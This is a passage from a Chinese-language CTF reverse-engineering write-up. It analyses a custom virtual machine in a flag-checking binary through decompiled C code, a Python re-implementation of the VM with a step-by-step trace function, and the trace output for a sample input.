&#123;<br>                                        v6 = *(_DWORD *)(a1 + 4LL * *((int *)a2 + <span class="hljs-number">2</span>));<br>                                        <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x22</span> )<br>                                          <span class="hljs-keyword">break</span>;<br>                                        *a2 += a2[<span class="hljs-number">3</span>];<br>                                        ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>                                      &#125;<br>                                      <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x23</span> )<br>                                        <span class="hljs-keyword">break</span>;<br>                                      *a2 -= a2[<span class="hljs-number">3</span>];<br>                                      ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>                                    &#125;<br>                                    <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x24</span> )<br>                                      <span class="hljs-keyword">break</span>;<br>                                    *a2 *= a2[<span class="hljs-number">3</span>];<br>                                    ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>                                  &#125;<br>                                  <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x25</span> )<br>                                    <span class="hljs-keyword">break</span>;<br>                                  <span class="hljs-keyword">if</span> ( !a2[<span class="hljs-number">3</span>] )<br>                                    <span class="hljs-keyword">return</span> __strlcpy_chk(byte_4CE8, <span class="hljs-string">&quot;Error: Division by zero&quot;</span>, 200LL, 200LL);<br>                                  *a2 /= a2[<span class="hljs-number">3</span>];<br>                                  ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>                                &#125;<br>                                <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x26</span> )<br>                                  <span class="hljs-keyword">break</span>;<br>                                *a2 ^= a2[<span class="hljs-number">3</span>];<br>                                ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>                              &#125;<br>                              <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x27</span> )<br>                                <span class="hljs-keyword">break</span>;<br>                              <span class="hljs-keyword">if</span> ( *((int *)a2 + <span class="hljs-number">3</span>) &gt; <span class="hljs-number">0x1F3</span> )<br>                                <span class="hljs-keyword">return</span> __strlcpy_chk(byte_4CE8, <span class="hljs-string">&quot;Error: Stack overflow&quot;</span>, 200LL, 200LL);<br>                              v3 = *a2;<br>                              v4 = (int)(*((_DWORD *)a2 + <span class="hljs-number">3</span>))++;<br>                              stack[v4] = v3;<br>                              ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>                            &#125;<br>                            <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x28</span> )<br>                              <span class="hljs-keyword">break</span>;<br>                            <span class="hljs-keyword">if</span> ( *((int *)a2 + <span class="hljs-number">3</span>) &lt; <span class="hljs-number">1</span> )<br>                              <span class="hljs-keyword">return</span> __strlcpy_chk(byte_4CE8, <span class="hljs-string">&quot;Error: Stack underflow&quot;</span>, 200LL, 200LL);<br>                            v5 = *((_DWORD *)a2 + <span class="hljs-number">3</span>) - <span class="hljs-number">1</span>;<br>                            *((_DWORD *)a2 + <span class="hljs-number">3</span>) = v5;<br>                            *a2 = stack[v5];<br>                            ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>                          &#125;<br>                          <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x29</span> )<br>                            <span class="hljs-keyword">break</span>;<br>                          <span class="hljs-keyword">if</span> ( a2[<span class="hljs-number">1</span>] &gt; 0x32u )<br>                          &#123;<br>                            *a2 = <span class="hljs-number">0</span>;<br>                          &#125;<br>                          <span class="hljs-keyword">else</span><br>                          &#123;<br>                            result = ((__int64 (__fastcall *)(void *))__emutls_get_address)(&amp;unk_44D8);<br>                            *a2 = *(_BYTE *)(result + a2[<span class="hljs-number">1</span>]);<br>                          &#125;<br>                          ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>                        &#125;<br>                        <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x2A</span> )<br>                          <span class="hljs-keyword">break</span>;<br>                        *a2 = a2[<span class="hljs-number">3</span>];<br>                        ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>                      &#125;<br>                      <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x2B</span> )<br>                        <span class="hljs-keyword">break</span>;<br>                      a2[<span class="hljs-number">1</span>] = *a2;<br>                      ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x2C</span> )<br>                      <span class="hljs-keyword">break</span>;<br>                    a2[<span class="hljs-number">2</span>] = *a2;<br>                    ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>                  &#125;<br>                  <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x2D</span> )<br>                    <span class="hljs-keyword">break</span>;<br>                  a2[<span class="hljs-number">3</span>] = *a2;<br>                  ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x2E</span> )<br>                  <span class="hljs-keyword">break</span>;<br>                *a2 = *(_DWORD *)(a1 + 4LL * *((int *)a2 + <span class="hljs-number">2</span>) + <span class="hljs-number">4</span>);<br>                *((_DWORD *)a2 + <span class="hljs-number">2</span>) += <span class="hljs-number">2</span>;<br>              &#125;<br>              <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x2F</span> )<br>                <span class="hljs-keyword">break</span>;<br>              *a2 = a2[<span class="hljs-number">1</span>];<br>              ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x30</span> )<br>              <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">if</span> ( a2[<span class="hljs-number">1</span>] &gt; 0x31u )<br>            &#123;<br>              a2[<span class="hljs-number">4</span>] = <span class="hljs-number">1</span>;<br>              <span class="hljs-keyword">return</span> result;<br>            &#125;<br>            *a2 = cmp_data[a2[<span class="hljs-number">1</span>]];<br>            ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>          &#125;<br>          <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x31</span> )<br>            <span class="hljs-keyword">break</span>;<br>          ++*a2;<br>          ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x32</span> )<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> ( --a2[<span class="hljs-number">2</span>] )<br>          *((_DWORD *)a2 + <span class="hljs-number">2</span>) -= *(_DWORD *)(a1 + 4LL * *((int *)a2 + <span class="hljs-number">2</span>) + <span class="hljs-number">4</span>);<br>        <span class="hljs-keyword">else</span><br>          *((_DWORD *)a2 + <span class="hljs-number">2</span>) += <span class="hljs-number">2</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">0x33</span> )<br>        <span class="hljs-keyword">break</span>;<br>      ++*((_DWORD *)a2 + <span class="hljs-number">4</span>);<br>      <span class="hljs-keyword">if</span> ( a2[<span class="hljs-number">1</span>] &gt;= 0x32u )<br>      &#123;<br>        a2[<span class="hljs-number">4</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span> result;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( !a2[<span class="hljs-number">4</span>] &amp;&amp; *a2 != a2[<span class="hljs-number">3</span>] )<br>        a2[<span class="hljs-number">4</span>] = <span class="hljs-number">1</span>;<br>      --a2[<span class="hljs-number">1</span>];<br>      ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">52</span> )<br>      <span class="hljs-keyword">break</span>;<br>    ++*((_DWORD *)a2 + <span class="hljs-number">2</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">255</span> )<br>    <span class="hljs-keyword">return</span> sub_17B8(byte_4CE8, 200LL, 200LL, <span class="hljs-string">&quot;Unknown opcode: %d&quot;</span>, v6);<br>  <span class="hljs-keyword">if</span> ( a2[<span class="hljs-number">4</span>] || *((_DWORD *)a2 + <span class="hljs-number">4</span>) != <span class="hljs-number">50</span> )<br>    <span class="hljs-keyword">return</span> __strlcpy_chk(byte_4CE8, <span class="hljs-string">&quot;Maybe something wrong??（存在不匹配元素）&quot;</span>, 200LL, 200LL);<br>  <span class="hljs-keyword">return</span> __strlcpy_chk(byte_4CE8, <span class="hljs-string">&quot;oh!You are right!&quot;</span>, 200LL, 200LL);<br>&#125;<br></code></pre></td></tr></table></figure><p>操作码就是刚刚的 code </p><p><img src="/../images/NSS2025/c2.png"></p><p>在 vm 还中发现一个 cmp_data</p><p><img src="/../images/NSS2025/c3.png"></p><p>分析这个 vm 可以知道它使用了四个寄存器来存值，第一个用于临时存储和算术运算，第二个用于索引输入字符串和 cmp_data 数组，第三个用于循环计数，第四个用于临时存储，把它们记为 A、B、C、D，还用了一个栈来存储数据<br>同构出 vm python 脚本来 trace 加密过程,跟之前写的 vm 同构脚本相比这次在 ai 的帮助下换了一种写法，写了一个单独的 trace 函数来打印每一步的状态，感觉比原来的要便捷很多</p><h4 id="同构-vm"><a href="#同构-vm" class="headerlink" title="同构 vm"></a>同构 vm</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs py">opcode = [<br>    <span class="hljs-number">0x34</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2D</span>,<br>    <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x23</span>,<br>    <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2E</span>,<br>    <span class="hljs-number">0x43</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x27</span>,<br>    <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x2B</span>,<br>    <span class="hljs-number">0x32</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x30</span>,<br>    <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0xFF</span><br>]<br><br>cmp_data = [<br>    <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x78</span>,<br>    <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x45</span>,<br>    <span class="hljs-number">0x37</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x3D</span>,<br>    <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x7E</span>,<br>    <span class="hljs-number">0x09</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x09</span>,<br>    <span class="hljs-number">0x43</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4C</span>,<br>]<br><br>input_str = <span class="hljs-string">&quot;12345678901234567890123456789&quot;</span><br><br><span class="hljs-comment"># 寄存器</span><br>A = B = C = D = <span class="hljs-number">0</span><br>stack = []<br>IP = <span class="hljs-number">0</span><br>step = <span class="hljs-number">0</span><br>error = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trace</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-keyword">global</span> step, A, B, C, D, IP, stack<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Step <span class="hljs-subst">&#123;step:2d&#125;</span>: IP=<span class="hljs-subst">&#123;IP:2d&#125;</span> | A=<span class="hljs-subst">&#123;A:02X&#125;</span> B=<span class="hljs-subst">&#123;B:02X&#125;</span> C=<span class="hljs-subst">&#123;C:02X&#125;</span> D=<span class="hljs-subst">&#123;D:02X&#125;</span> | <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;       Stack: <span class="hljs-subst">&#123;[<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x:02X&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> stack]&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">while</span> IP &lt; <span class="hljs-built_in">len</span>(opcode):<br>    op = opcode[IP]<br>    step += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">0x22</span>:  <span class="hljs-comment"># A += D</span><br>        A = (A + D) &amp; <span class="hljs-number">0xFF</span><br>        trace(<span class="hljs-string">&quot;A += D&quot;</span>)<br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x23</span>:  <span class="hljs-comment"># A -= D</span><br>        A = (A - D) &amp; <span class="hljs-number">0xFF</span><br>        trace(<span class="hljs-string">&quot;A -= D&quot;</span>)<br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x26</span>:  <span class="hljs-comment"># A ^= D</span><br>        A ^= D<br>        trace(<span class="hljs-string">&quot;A ^= D&quot;</span>)<br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x27</span>:  <span class="hljs-comment"># push A</span><br>        stack.append(A)<br>        trace(<span class="hljs-string">&quot;push A&quot;</span>)<br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x28</span>:  <span class="hljs-comment"># pop A</span><br>        <span class="hljs-keyword">if</span> stack:<br>            A = stack.pop()<br>            trace(<span class="hljs-string">&quot;pop A&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            trace(<span class="hljs-string">&quot;ERROR: stack underflow&quot;</span>)<br>            error = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x29</span>:  <span class="hljs-comment"># A = input[B]</span><br>        <span class="hljs-keyword">if</span> B &lt; <span class="hljs-built_in">len</span>(input_str):<br>            A = <span class="hljs-built_in">ord</span>(input_str[B])<br>            trace(<span class="hljs-string">f&quot;A = input[<span class="hljs-subst">&#123;B&#125;</span>] = &#x27;<span class="hljs-subst">&#123;input_str[B]&#125;</span>&#x27; (<span class="hljs-subst">&#123;A:02X&#125;</span>)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            trace(<span class="hljs-string">&quot;ERROR: input index OOB&quot;</span>)<br>            error = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x2B</span>:  <span class="hljs-comment"># B = A</span><br>        B = A<br>        trace(<span class="hljs-string">&quot;B = A&quot;</span>)<br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x2C</span>:  <span class="hljs-comment"># C = A</span><br>        C = A<br>        trace(<span class="hljs-string">&quot;C = A&quot;</span>)<br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x2D</span>:  <span class="hljs-comment"># D = A</span><br>        D = A<br>        trace(<span class="hljs-string">&quot;D = A&quot;</span>)<br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x2E</span>:  <span class="hljs-comment"># load immediate</span><br>        <span class="hljs-keyword">if</span> IP + <span class="hljs-number">1</span> &lt; <span class="hljs-built_in">len</span>(opcode):<br>            A = opcode[IP+<span class="hljs-number">1</span>]<br>            trace(<span class="hljs-string">f&quot;load immediate <span class="hljs-subst">&#123;A:02X&#125;</span>&quot;</span>)<br>            IP += <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            trace(<span class="hljs-string">&quot;ERROR: no immediate&quot;</span>)<br>            error = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x2F</span>:  <span class="hljs-comment"># A = B</span><br>        A = B<br>        trace(<span class="hljs-string">&quot;A = B&quot;</span>)<br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x30</span>:  <span class="hljs-comment"># A = cmp_data[B]</span><br>        <span class="hljs-keyword">if</span> B &lt; <span class="hljs-built_in">len</span>(cmp_data):<br>            A = cmp_data[B]<br>            trace(<span class="hljs-string">f&quot;A = cmp_data[<span class="hljs-subst">&#123;B&#125;</span>] = <span class="hljs-subst">&#123;A:02X&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            trace(<span class="hljs-string">&quot;ERROR: cmp_data index OOB&quot;</span>)<br>            error = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x31</span>:  <span class="hljs-comment"># A++</span><br>        A = (A+<span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFF</span><br>        trace(<span class="hljs-string">&quot;A++&quot;</span>)<br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x32</span>:  <span class="hljs-comment"># C-- and jump if not zero</span><br>        C = (C-<span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFF</span><br>        <span class="hljs-keyword">if</span> C != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> IP+<span class="hljs-number">1</span> &lt; <span class="hljs-built_in">len</span>(opcode):<br>                offset = opcode[IP+<span class="hljs-number">1</span>]<br>                IP = (IP + offset) &amp; <span class="hljs-number">0xFFFF</span><br>                trace(<span class="hljs-string">f&quot;C--=<span class="hljs-subst">&#123;C&#125;</span>, jump to <span class="hljs-subst">&#123;IP&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                trace(<span class="hljs-string">&quot;ERROR: no jump offset&quot;</span>)<br>                error = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            trace(<span class="hljs-string">f&quot;C--=<span class="hljs-subst">&#123;C&#125;</span>, no jump&quot;</span>)<br>            IP += <span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x33</span>:  <span class="hljs-comment"># compare A and D</span><br>        <span class="hljs-keyword">if</span> A != D:<br>            trace(<span class="hljs-string">f&quot;ERROR: compare fail A=<span class="hljs-subst">&#123;A:02X&#125;</span> D=<span class="hljs-subst">&#123;D:02X&#125;</span>&quot;</span>)<br>            error = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            trace(<span class="hljs-string">f&quot;compare OK A=<span class="hljs-subst">&#123;A:02X&#125;</span> == D=<span class="hljs-subst">&#123;D:02X&#125;</span>&quot;</span>)<br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0x34</span>:<br>        trace(<span class="hljs-string">&quot;init/unknown&quot;</span>)<br>        IP += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-number">0xFF</span>:<br>        trace(<span class="hljs-string">&quot;end&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">else</span>:<br>        trace(<span class="hljs-string">f&quot;ERROR: unknown opcode <span class="hljs-subst">&#123;op:02X&#125;</span>&quot;</span>)<br>        error = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>运行结果是</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">Step</span>  1: IP= 0 | <span class="hljs-attribute">A</span>=00 <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=00 <span class="hljs-attribute">D</span>=00 | init/unknown<br>       Stack: []<br><span class="hljs-keyword">Step</span>  2: IP= 1 | <span class="hljs-attribute">A</span>=00 <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=00 <span class="hljs-attribute">D</span>=00 | load immediate 00<br>       Stack: []<br><span class="hljs-keyword">Step</span>  3: IP= 3 | <span class="hljs-attribute">A</span>=00 <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=00 <span class="hljs-attribute">D</span>=00 | B = A<br>       Stack: []<br><span class="hljs-keyword">Step</span>  4: IP= 4 | <span class="hljs-attribute">A</span>=19 <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=00 <span class="hljs-attribute">D</span>=00 | load immediate 19<br>       Stack: []<br><span class="hljs-keyword">Step</span>  5: IP= 6 | <span class="hljs-attribute">A</span>=19 <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=00 | C = A<br>       Stack: []<br><span class="hljs-keyword">Step</span>  6: IP= 7 | <span class="hljs-attribute">A</span>=31 <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=00 | A = input[0] = <span class="hljs-string">&#x27;1&#x27;</span> (31)<br>       Stack: []<br><span class="hljs-keyword">Step</span>  7: IP= 8 | <span class="hljs-attribute">A</span>=31 <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=31 | D = A<br>       Stack: []<br><span class="hljs-keyword">Step</span>  8: IP= 9 | <span class="hljs-attribute">A</span>=4E <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=31 | load immediate 4E<br>       Stack: []<br><span class="hljs-keyword">Step</span>  9: <span class="hljs-attribute">IP</span>=11 | <span class="hljs-attribute">A</span>=7F <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=31 | A += D<br>       Stack: []<br><span class="hljs-keyword">Step</span> 10: <span class="hljs-attribute">IP</span>=12 | <span class="hljs-attribute">A</span>=7F <span class="hljs-attribute">B</span>=00 